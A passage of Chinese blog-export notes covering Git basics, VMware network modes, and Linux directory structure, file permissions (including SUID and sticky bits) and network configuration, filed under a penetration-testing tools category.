表示将已跟踪文件中的修改和删除的文件添加到暂存区，不包括新增加的文件，注意这些被删除的文件被加入到暂存区再被提交并推送到服务器的版本库之后这个文件就会从git系统中消失了。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git add -A .</span></span><br><span class="line">\A 表示将所有的已跟踪的文件的修改与删除和新增的未跟踪的文件都添加到暂存区。</span><br></pre></td></tr></table></figure><h3 id="Git-commit"><a href="#Git-commit" class="headerlink" title="Git commit"></a>Git commit</h3><p><code>git commit</code> 主要是将暂存区里的改动给提交到本地的版本库。每次使用git commit 命令我们都会在本地版本库生成一个40位的哈希值，这个哈希值也叫commit-id，<br>commit-id 在版本回退的时候是非常有用的，它相当于一个快照,可以在未来的任何时候通过与git reset的组合命令回到这里.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m ‘message’</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-m 参数表示可以直接输入后面的“message”，如果不加 -m参数，那么是不能直接输入message的，而是会调用一个编辑器一般是vim来让你输入这个message，message即是我们用来简要说明这次提交的语句。</span></span><br><span class="line"></span><br><span class="line">git commit -am ‘message’ -am等同于-a -m</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-a参数可以将所有已跟踪文件中的执行修改或删除操作的文件都提交到本地仓库，即使它们没有经过git add添加到暂存区，</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意: 新加的文件（即没有被git系统管理的文件）是不能被提交到本地仓库的。</span></span><br></pre></td></tr></table></figure><h3 id="Git-push"><a href="#Git-push" class="headerlink" title="Git push"></a>Git push</h3><p>在使用git commit命令将修改从暂存区提交到本地版本库后，只剩下最后一步将本地版本库的分支推送到远程服务器上对应的分支了。<br>git push的一般形式为 <code>git push &lt;远程主机名&gt; &lt;本地分支名&gt; &lt;远程分支名&gt;</code> ，例如 <code>git push origin master：refs/for/master</code> ，即是将本地的master分支推送到远程主机origin上的对应master分支， origin 是远程主机名。第一个master是本地分支名，第二个master是远程分支名。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果远程分支被省略，如上则表示将本地分支推送到与之存在追踪关系的远程分支（通常两者同名），如果该远程分支不存在，则会被新建</span></span><br><span class="line"></span><br><span class="line">git push origin ：refs/for/master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支，等同于 git push origin --delete master</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关于 refs/for：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">refs/for 的意义在于我们提交代码到服务器之后是需要经过code review 之后才能进行merge的，而refs/heads 不需要</span></span><br><span class="line"></span><br><span class="line">git push origin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果当前分支与远程分支存在追踪关系，则本地分支和远程分支都可以省略，将当前分支推送到origin主机的对应分支</span></span><br><span class="line"></span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果当前分支只有一个远程分支，那么主机名都可以省略，形如 git push，可以使用git branch -r ，查看远程的分支名</span></span><br></pre></td></tr></table></figure><h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">克隆</span></span><br><span class="line">git clone http://xxx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拉取</span></span><br><span class="line">git pull http://xxx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加</span></span><br><span class="line">git add xxx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">描述信息</span></span><br><span class="line">git commit -m &quot;提交&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">推送到远程</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h2 id="pull拉取最新代码"><a href="#pull拉取最新代码" class="headerlink" title="pull拉取最新代码"></a>pull拉取最新代码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地仓库的代码还未被更新，此时：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更新远程仓库的代码为最新的</span></span><br><span class="line">git fetch --all</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让本地代码与origin / master完全相同</span></span><br><span class="line">git reset --hard origin/master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git pull拉取远程代码</span></span><br><span class="line">git pull origin master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git merge将暂存区代码更新到本地工作区</span></span><br><span class="line">git merge master</span><br></pre></td></tr></table></figure><h2 id="拉取代码，解决冲突"><a href="#拉取代码，解决冲突" class="headerlink" title="拉取代码，解决冲突"></a>拉取代码，解决冲突</h2><p>场景：公司已创建有仓库，需要拉取最新代码并上传自己的代码。</p><h3 id="拉取仓库代码"><a href="#拉取仓库代码" class="headerlink" title="拉取仓库代码"></a><strong>拉取仓库代码</strong></h3><p>（拉取时有冲突需要先解决冲突再拉取，或者先保存本地代码再提交）</p><blockquote><p><a href="https://blog.csdn.net/londa/article/details/109482251">git 临时保存代码方法</a></p></blockquote><h2 id="git-关联-x2F-创建仓库并上传代码"><a href="#git-关联-x2F-创建仓库并上传代码" class="headerlink" title="git 关联&#x2F;创建仓库并上传代码"></a>git 关联&#x2F;创建仓库并上传代码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Git全局设置：</span></span><br><span class="line">git config --global user.name &quot;yusong&quot;</span><br><span class="line">git config --global user.email &quot;1195754621@qq.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建 git 仓库：</span></span><br><span class="line">mkdir vuestart</span><br><span class="line">cd vuestart</span><br><span class="line">git init </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#输入git init（初始化当前目录，即创建Git仓库。)你可以在目录下看到一个.git文件夹</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#按照流程输入用户名和邮箱名名字可以随便取，注意要有空格，少了空格会提示重新输入</span></span></span><br><span class="line">touch README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://gitee.com/xxx/xxx.git</span><br><span class="line">git push -u origin &quot;master&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">已有仓库?</span></span><br><span class="line">cd existing_git_repo</span><br><span class="line">git remote add origin https://gitee.com/xxx/xxx.git</span><br><span class="line">git push -u origin &quot;master&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看关联的仓库</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure><h2 id="关联已有仓库并提交代码"><a href="#关联已有仓库并提交代码" class="headerlink" title="关联已有仓库并提交代码"></a>关联已有仓库并提交代码</h2><p>第一步：找到适合位置，右键打开git工具</p><p>第二步：克隆或拉取代码</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone http://xxx.git</span><br><span class="line">git pull http://xxx.git</span><br></pre></td></tr></table></figure><p>第三步：创建和切换分支</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.【git branch】查看一下本地分支，再【git branch -a】查看一下远程分支，对比下，远程存在哪些本地没有的新分支.</span><br><span class="line">2.将某个远程主机的更新，全部取回本地：【git fetch】</span><br><span class="line">3.再次查看远程分支：【git branch -a】 发现远程的分支已经可以看见了</span><br><span class="line">4.拉取远程分支到本地：</span><br><span class="line">创建远程分支并切换到该分支:【git checkout -b (远程分支名)】 </span><br><span class="line">拉取远程分支代码到本地分支：【git pull origin (远程分支名称)]</span><br></pre></td></tr></table></figure><p>第四三步：将要上传的代码拷贝到当前目录下</p><p>第五步：上传并提交代码</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add xxx/</span><br><span class="line">git commit -m &quot;init-1.0&quot;</span><br><span class="line">git push origin feature</span><br></pre></td></tr></table></figure><h2 id="其他命令："><a href="#其他命令：" class="headerlink" title="其他命令："></a>其他命令：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -r  #查看远程所有分支</span><br><span class="line">git branch #查看本地所有分支</span><br><span class="line">git branch -a #查看本地及远程的所有分支</span><br><span class="line">git fetch  #将某个远程主机的更新，全部取回本地</span><br><span class="line">git remote -v #查看仓库关联情况</span><br><span class="line">git status #查看git状态</span><br></pre></td></tr></table></figure><h2 id="git记住某个仓库的账号密码"><a href="#git记住某个仓库的账号密码" class="headerlink" title="git记住某个仓库的账号密码"></a>git记住某个仓库的账号密码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config credential.helper store</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里没有–global意思是指只对这个仓库生效，建议以后都不要加–global，让代码配置以仓库为单位存储就好，设置成全局不灵活。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后git push 到远程仓库，按提示输入用户名和密码，注意要输入正确的（GitHub的用户名和密码）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这样，下次就不用再输入账号和密码了。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">若想把项目记住的用户名和密码删掉，输入下列命令：</span></span><br><span class="line">git credential-manager uninstall</span><br></pre></td></tr></table></figure><h2 id="Git-socks代理"><a href="#Git-socks代理" class="headerlink" title="Git socks代理"></a>Git socks代理</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">前提是你本地有 socks5 代理，本地socks开启局域网连接</span></span><br><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git clone https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.runoob.com/git/git-tutorial.html">Git教程</a></li><li><a href="https://www.cnblogs.com/kumata/p/9061166.html">Git：从github上克隆、修改和更新项目</a></li><li><a href="https://www.runoob.com/git/git-pull.html">git pull语法(重要）</a></li><li><a href="https://www.cnblogs.com/gdjlc/p/12088872.html">最详细的git Windows的教程和git使用方法</a></li><li><a href="https://blog.csdn.net/justidle/article/details/108768730">Git 命令行使用</a></li><li><a href="https://www.bilibili.com/video/BV12K4y1a7AH/?from=search&seid=4045120365387477075&spm_id_from=333.337.0.0&vd_source=e73a152dada4626bad49c30d848902f7">B站关于 Git 命令使用最简单而且最详细讲解</a></li><li><a href="https://blog.csdn.net/weixin_38088097/article/details/106680130?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164213532216780261932394%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164213532216780261932394&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-106680130.pc_search_insert_es_download&utm_term=git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&spm=1018.2226.3001.4187">git常用命令总结</a></li><li><a href="https://blog.csdn.net/zz210891470/article/details/81354568">Git初次使用步骤</a></li><li>[git]merge和rebase的区别</li></ul><blockquote><ul><li><a href="https://www.cnblogs.com/xueweihan/p/5743327.html">https://www.cnblogs.com/xueweihan/p/5743327.html</a></li><li><a href="https://www.cnblogs.com/ellen-mylife/p/12794245.html">https://www.cnblogs.com/ellen-mylife/p/12794245.html</a></li><li><a href="https://www.jianshu.com/p/0cd05dd1cc73">https://www.jianshu.com/p/0cd05dd1cc73</a></li></ul></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware使用</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/vmware%E4%BD%BF%E7%94%A8/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/vmware%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="vmware虚拟网卡的解释"><a href="#vmware虚拟网卡的解释" class="headerlink" title="vmware虚拟网卡的解释"></a>vmware虚拟网卡的解释</h1><p>为什么windows主机可以访问内网的网站呢，为什么可以ping通Ubuntu和win7呢，因为在VM里创建虚拟网卡的时候，在Windows上面也创建了虚拟网卡，通过<code>IPconfig /all</code>命令，可以看得到。如果不想让主机访问到内网，可以在设置里面禁用虚拟网卡或者设置防火墙：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181001851.png" alt="image-20220818095458787" style="zoom:50%;" /><p>在每次用vmware启用一个虚拟网络的时候，会工根据所选择的网卡模式，产生不同的虚拟网段和虚拟网卡</p><p>安装了VMware的时候电脑上默认会出现三块虚拟网卡VMware Network Adapter VMnet0、VMware Network Adapter VMnet1和VMware Network Adapter VMnet8.</p><blockquote><ul><li>VMnet0：一般用于桥接模式</li><li>VMnet1：一般用于仅主机模式</li><li>VMnet8：一般用于NAT模式</li></ul></blockquote><h1 id="虚拟网卡的三种模式"><a href="#虚拟网卡的三种模式" class="headerlink" title="虚拟网卡的三种模式"></a>虚拟网卡的三种模式</h1><h2 id="桥接模式-Bridged"><a href="#桥接模式-Bridged" class="headerlink" title="桥接模式(Bridged)"></a>桥接模式(Bridged)</h2><p>桥接是和主机并列，桥接到路由器，虚拟机地址由路由器分配，也就是，主机和kali在同一网段！</p><p>桥接模式可以简单理解为通过物理主机网卡架设了一座桥，从而连入到了实际网络中。因此，虚拟机可以被分配与物理主机相同网段的独立IP，所有网络功能和网络中的真实机器几乎完全一样。桥接模式下的虚拟机和网内真实计算机所处的位置是一样的。在Bridged模式下，电脑设备创建的虚拟机就像一台真正的计算机一样，它会直接连接到实际的网络上，上网与宿主机（电脑设备）没有联系。Bridged网络类型的原理逻辑图下图所示。所以，现在是不是可以理解 在虚拟网卡中 没有 VMware Network AdepterVMnet0 了 ，因为它就是 宿主机 所在局域网 中的另外一台主机。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221431670.png" alt="image-20220922143109469" style="zoom: 33%;" /><h3 id="配置步骤："><a href="#配置步骤：" class="headerlink" title="配置步骤："></a>配置步骤：</h3><blockquote><p>1、点击“编辑虚拟机设置”来设置网卡模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221602019.png" alt="image-20220922154047072" style="zoom:50%;" /><p>2、如想配置静态地址则可打开 vim &#x2F;etc&#x2F;network&#x2F;interfaces 进行配置</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221602089.png" alt="image-20220922154057911" style="zoom:50%;" /><p>3、在配置dns解析服务器使用命令打开 vi &#x2F;etc&#x2F;resolv.conf</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221602069.png" alt="image-20220922154106114" style="zoom:50%;" /></blockquote><h2 id="仅主机模式-Host-Only"><a href="#仅主机模式-Host-Only" class="headerlink" title="仅主机模式(Host-Only)"></a>仅主机模式(Host-Only)</h2><p>原理：在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是 Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMwareNetworkAdepterVMnet1虚拟网卡来实现的。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221431704.png" alt="image-20220922143126396" style="zoom: 33%;" /><h3 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h3><blockquote><ol><li>点“编辑”设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221539342.png" alt="image-20220922153956221" style="zoom:50%;" /><ol start="2"><li><p>设置虚拟机为Host-Only模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540726.png" alt="image-20220922154008639" style="zoom:50%;" /></li><li><p>设置网卡文件vim &#x2F;etc&#x2F;network&#x2F;interfaces设置静态ip</p></li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221600390.png" alt="image-20220922154018569" style="zoom:50%;" /><ol start="4"><li>保存退出，然后重启网络服务 <code>systemctl restart networking</code></li></ol></blockquote><h2 id="NAT模式-地址转换"><a href="#NAT模式-地址转换" class="headerlink" title="NAT模式(地址转换)"></a>NAT模式(地址转换)</h2><p>NAT（Network Address Translation），网络地址转换，NAT模式是比较简单的实现虚拟机上网的方式，NAT模式的虚拟机就是通过宿主机（物理电脑）上网和交换数据的。 这种模式也是使用Vmware虚拟机最常用的模式。在NAT模式下，虚拟机的网卡连接到宿主机的VMnet8上（安装完Vmware虚拟机会多出两个虚拟网卡Vmware1和Vmware8）。此时系统的VMware NAT Service服务就充当了路由器，负责将虚拟机发到VMnet8的包进行地址转换之后发到实际的网络上，再将实际网络上返回的包进行地址转换后通过VMnet8发送给虚拟机。VMware DHCP Service负责为虚拟机分配IP地址。NAT网络类型的原理逻辑图如下图所示。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221430774.png" alt="image-20220922143026568" style="zoom:33%;" /><p>nat模式下的虚拟网卡简而言之就是一个虚拟的路由器。nat模式下的虚拟机ip是怎么来的呢，就是依靠主机虚拟网卡vmnet8，分配的地址。通过nat得到的ip是和虚拟网卡在同一网段的。一般来说，nat模式下的虚拟机的网关也就是虚拟网卡vmnet8的地址~~</p><p>下面的图中可以直观的看到：</p><p>这是主机vmnet8的地址，也就是vmware虚拟化的网卡，地址是192.168.1.1</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221426815.png" alt="image-20220922142620659" style="zoom:50%;" /><p>这是nat模式下的kali虚拟机ip，被分配了一个在1网段的内网地址，实际上就是vmnet8的作用</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221427897.png" alt="image-20220922142716754" style="zoom:50%;" /><h3 id="配置步骤：-1"><a href="#配置步骤：-1" class="headerlink" title="配置步骤："></a>配置步骤：</h3><blockquote><p>1、kali如果使用dhcp则可不进行配置</p><p>2、配置静态ip：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221604802.png" alt="image-20220922154132900" style="zoom:50%;" /></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用基础</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Kali&amp;Linux/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Kali&amp;Linux/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h1><p>Kali Linux是基于debian的发行版。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940750.png" alt="image-20220818094012557" style="zoom:50%;" /><h1 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h1><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940707.png" alt="image-20220818094044556" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/：根目录，每一个文件和目录都从这里开始。只有root用户具有该目录下的写权限。</span><br><span class="line">/bin：用户二进制文件，包含二进制可执行文件。系统的所有用户使用的命令都设在这里，例如：ps，ls，ping，grep，cp等。</span><br><span class="line">/boot：这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</span><br><span class="line">/dev ：设备文件，dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。</span><br><span class="line">/etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。</span><br><span class="line">/home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</span><br><span class="line">/lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</span><br><span class="line">/opt：可选的附加应用程序，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库就可以放到这个目录下。默认是空的。</span><br><span class="line">/root：该目录为系统管理员，也称作超级权限者的用户主目录。</span><br><span class="line">/sbin：s就是Super User的意思，系统二进制文件，在这个目录下的linux命令通常由系统管理员使用。</span><br><span class="line">/usr：这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</span><br><span class="line">/usr/bin：系统用户使用的应用程序。</span><br><span class="line">/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。</span><br><span class="line">/tmp：这个目录是用来存放一些临时文件的。</span><br><span class="line">/var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</span><br></pre></td></tr></table></figure><h1 id="Linux文件权限及属性"><a href="#Linux文件权限及属性" class="headerlink" title="Linux文件权限及属性"></a>Linux文件权限及属性</h1><h2 id="常用权限"><a href="#常用权限" class="headerlink" title="常用权限"></a>常用权限</h2><blockquote><p><a href="https://m.runoob.com/linux/linux-comm-chown.html">chown命令</a></p></blockquote><p>用ll命令列出来所有文件的权限，一般而言，你是什么用户创建的文件，其文件所属用户就对应于对应用户</p><p>Linux里面的权限控制及其细分，注意组的权限和个人权限，即使文件没有个人权限，如果所属组有权限，那么也是可以执行的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r：4</span><br><span class="line">w：2</span><br><span class="line">x：1</span><br><span class="line">属主：u（user）</span><br><span class="line">数组：g（group）</span><br><span class="line">其他：o（other）</span><br><span class="line"><span class="built_in">chmod</span> u+x <span class="built_in">test</span>                        <span class="comment">#chmod    change mode</span></span><br><span class="line"><span class="built_in">chown</span> root.root <span class="built_in">test</span>                  <span class="comment">#chown    change owner    root，root前面的是用户，后面的是组</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">    -rw-r--r--  1 kali kali 11759  2月 23 05:36 .face</span><br><span class="line">    lrwxrwxrwx  1 kali kali     5  2月 23 05:36 .face.icon -&gt; .face</span><br><span class="line">    drwx------  3 kali kali  4096  3月 31 06:00 .gnupg</span><br><span class="line">-开头表示这是一个文件</span><br><span class="line">l开头表示这是一个链接</span><br><span class="line">d开头表示这是一个目录</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180947778.png" alt="image-20220818094710630" style="zoom:50%;" /><h2 id="其他权限"><a href="#其他权限" class="headerlink" title="其他权限"></a>其他权限</h2><p>除了读写执行权限外系统还支持强制位（s权限）和粘滞位（t权限）</p><h3 id="s权限"><a href="#s权限" class="headerlink" title="s权限"></a><strong>s权限</strong></h3><h4 id="s权限简介："><a href="#s权限简介：" class="headerlink" title="s权限简介："></a>s权限简介：</h4><p>s即（SUID,Set UID）。设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份. 典型的文件是passwd. 如果一般用户执行该文件, 则在执行过程中, 该文件可以获得root权限, 从而可以更改用户的密码.</p><p>可执行的文件搭配这个权限，便能得到特权，任意存取该文件的所有者能使用的全部系统资源。请注意具备SUID权限的文件，黑客经常利用这种权限，以SUID配上root帐号拥有者，无声无息地在系统中开扇后门，供日后进出使用。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 pythontab pythontab 32988 2018-03-16 14:25 /usr/bin/passwd</span><br></pre></td></tr></table></figure><h4 id="设置s权限"><a href="#设置s权限" class="headerlink" title="设置s权限"></a>设置s权限</h4><ul><li>我们可以通过<strong>字符模式</strong>设置s权限</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod a+s filename</span><br></pre></td></tr></table></figure></blockquote><ul><li>也可以使用<strong>绝对模式</strong>进行设置：</li></ul><blockquote><ul><li>设置suid：将相应的权限位之前的那一位设置为4；</li><li>设置guid：将相应的权限位之前的那一位设置为2；</li><li>两者都置位：将相应的权限位之前的那一位设置为4+2&#x3D;6。</li></ul></blockquote><p>注意：在设置s权限时文件属主、属组必须先设置相应的x权限，否则s权限并不能正真生效（chmode命令不进行必要的完整性检查，即使不设置x权限就设置s权限，chmod也不会报错，当我们ls -l时看到rwS，大写S说明s权限未生效）</p><h3 id="t权限"><a href="#t权限" class="headerlink" title="t权限"></a><strong>t权限</strong></h3><p>t权限：要删除一个文档，您不一定要有这个文档的写权限，但您一定要有这个文档的上级目录的写权限。也就是说，您即使没有一个文档的写权限，但您有这个文档的上级目录的写权限，也能够把这个文档给删除，而假如没有一个目录的写权限，也就不能在这个目录下创建文档。</p><p>怎样才能使一个目录既能够让任何用户写入文档，又不让用户删除这个目录下他人的文档，t权限就是能起到这个作用。t权限一般只用在目录上，用在文档上起不到什么作用。</p><p>在一个目录上设了t权限位后，（如&#x2F;home，权限为1777)任何的用户都能够在这个目录下创建文档，但只能删除自己创建的文档(root除外)，这就对任何用户能写的目录下的用户文档 启到了保护的作用。</p><p>可以通过chmod +t filename 来设置t权限</p><blockquote><p>注：&#x2F;tmp和 &#x2F;var&#x2F;tmp目录供所有用户暂时存取文件，亦即每位用户皆拥有完整的权限进入该目录，去浏览、删除和移动文件。</p></blockquote><h1 id="Kali配置"><a href="#Kali配置" class="headerlink" title="Kali配置"></a>Kali配置</h1><h2 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo su</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h2 id="linux网络配置文件详解-设置固定IP）"><a href="#linux网络配置文件详解-设置固定IP）" class="headerlink" title="linux网络配置文件详解(设置固定IP）"></a>linux网络配置文件详解(设置固定IP）</h2><blockquote><p>eth0，eth1，eth2……代表网卡一，网卡二，网卡三……</p><p>lo代表回环地址127.0.0.1，即localhost</p></blockquote><p>如果不想通过DHCP随机分配ip地址（当IP租期一过就会重新分配），就需要通过修改网络配置文件，改为固定的IP，文件所在目录如下：</p><p>&#x3D;&#x3D;&gt;centos的网络配置文件在<code>/etc/sysconfig/network-scripts</code>目录下</p><blockquote><ul><li><p><a href="https://www.cnblogs.com/ArthurYu/p/13908934.html">https://www.cnblogs.com/ArthurYu/p/13908934.html</a></p></li><li><p><a href="https://blog.csdn.net/weixin_42476945/article/details/104164056">https://blog.csdn.net/weixin_42476945/article/details/104164056</a></p></li></ul></blockquote><p>&#x3D;&#x3D;&gt;ubuntu的网络配置文件在<code>/etc/network</code>目录下</p><blockquote><ul><li><a href="https://blog.csdn.net/qq_38880380/article/details/99442543#:~:text=Ubuntu%20%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%20%EF%BC%9A%20%E4%B8%80%E3%80%81linux%20%E7%BD%91%E7%BB%9C%20%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BD%A2%E5%BC%8F%20%E5%85%88%E7%AE%80%E5%8D%95%E8%AF%B4%E4%B8%8B%E7%BB%99Ubuntu%20%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C,%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%20%EF%BC%9A%201.%E8%BF%9B%E5%85%A5interfaces%20%E9%85%8D%E7%BD%AE%20sudo%20vi%20%2Fetc%2Fnetwork%2Finterfaces%202.">linux–ubuntu网络配置</a></li><li><a href="https://www.cnblogs.com/lshan/p/15787497.html">ubuntu20.04 修改　DNS 　ip</a></li></ul></blockquote><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">配置文件位置：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">1. DEVICE=eth0 网卡的名字</span><br><span class="line">2. HWADDR=00:0c:29:90:89:d9 HWADDR HardWare Address 硬件地址 MAC地址</span><br><span class="line">3. TYPE=Ethernet 网络类型 以太网</span><br><span class="line">4. UUID=ae779ae6-044d-43d5-a33b-48c89e8de10e #UUID 做到系统中独一无二。</span><br><span class="line">5. ONBOOT=yes BOOT ON ? 在开机或重启网卡的时候是否启动网卡</span><br><span class="line">6. NM_CONTROLLED=yes 是否受network程序管理</span><br><span class="line">7. BOOTPROTO=none 网卡是如何获取到ip地址 网卡获取ip地址的方式</span><br><span class="line">　　a. dhcp 